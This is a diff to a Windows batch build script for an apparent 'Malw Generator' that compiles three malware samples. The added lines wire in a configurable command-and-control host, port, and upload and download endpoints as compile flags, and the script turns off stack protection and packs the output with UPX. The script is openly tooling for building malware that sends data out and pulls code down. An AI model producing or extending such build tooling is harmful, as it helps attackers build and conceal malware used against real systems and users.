@@ -6,9 +6,23 @@ set "OUTPUT_DIR=%PROJECT_ROOT%\output\windows"
 
 if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"
 
+set "C2_HOST=%~1"
+if "!C2_HOST!"=="" set "C2_HOST=example.com"
+set "C2_PORT=%~2"
+if "!C2_PORT!"=="" set "C2_PORT=443"
+set "UPLOAD_ENDPOINT=%~3"
+if "!UPLOAD_ENDPOINT!"=="" set "UPLOAD_ENDPOINT=/api/upload"
+set "DOWNLOAD_ENDPOINT=%~4"
+if "!DOWNLOAD_ENDPOINT!"=="" set "DOWNLOAD_ENDPOINT=/api/download"
+
 echo ========================================
 echo Malw Generator - Windows Compiler
 echo ========================================
+echo.
+echo [*] C2 Host: !C2_HOST!
+echo [*] C2 Port: !C2_PORT!
+echo [*] Upload Endpoint: !UPLOAD_ENDPOINT!
+echo [*] Download Endpoint: !DOWNLOAD_ENDPOINT!
 echo.
 
 where cl >nul 2>nul
@@ -30,16 +44,18 @@ if errorlevel 1 (
 echo.
 
 set "CFLAGS=/O2 /GS- /D_UNICODE /DUNICODE /I%PROJECT_ROOT%"
+set "CFLAGS=!CFLAGS! /DC2_HOST=\"!C2_HOST!\" /DC2_PORT=!C2_PORT!"
+set "CFLAGS=!CFLAGS! /DUPLOAD_ENDPOINT=\"!UPLOAD_ENDPOINT!\" /DDOWNLOAD_ENDPOINT=\"!DOWNLOAD_ENDPOINT!\""
 set "LDFLAGS=winhttp.lib ws2_32.lib"
 
 echo --- Compiling ---
 echo.
 
 echo [1/3] Building simple_malw...
-cl %CFLAGS% ^
+cl !CFLAGS! ^
     "%PROJECT_ROOT%\malw\simple\simple_malw.c" ^
     /Fe"%OUTPUT_DIR%\simple_malw.exe" ^
-    %LDFLAGS%
+    !LDFLAGS!
 echo   -^> simple_malw.exe built
 
 if "!UPX_AVAILABLE!"=="1" (
@@ -50,10 +66,10 @@ if "!UPX_AVAILABLE!"=="1" (
 
 echo.
 echo [2/3] Building medium_malw...
-cl %CFLAGS% ^
+cl !CFLAGS! ^
     "%PROJECT_ROOT%\malw\medium\medium_malw.c" ^
     /Fe"%OUTPUT_DIR%\medium_malw.exe" ^
-    %LDFLAGS%
+    !LDFLAGS!
 echo   -^> medium_malw.exe built
 
 if "!UPX_AVAILABLE!"=="1" (
@@ -64,10 +80,10 @@ if "!UPX_AVAILABLE!"=="1" (
 
 echo.
 echo [3/3] Building complex_malw...
-cl %CFLAGS% ^
+cl !CFLAGS! ^
     "%PROJECT_ROOT%\malw\complex\complex_malw.c" ^
     /Fe"%OUTPUT_DIR%\complex_malw.exe" ^
-    %LDFLAGS%
+    !LDFLAGS!
 echo   -^> complex_malw.exe built
 
 if "!UPX_AVAILABLE!"=="1" (
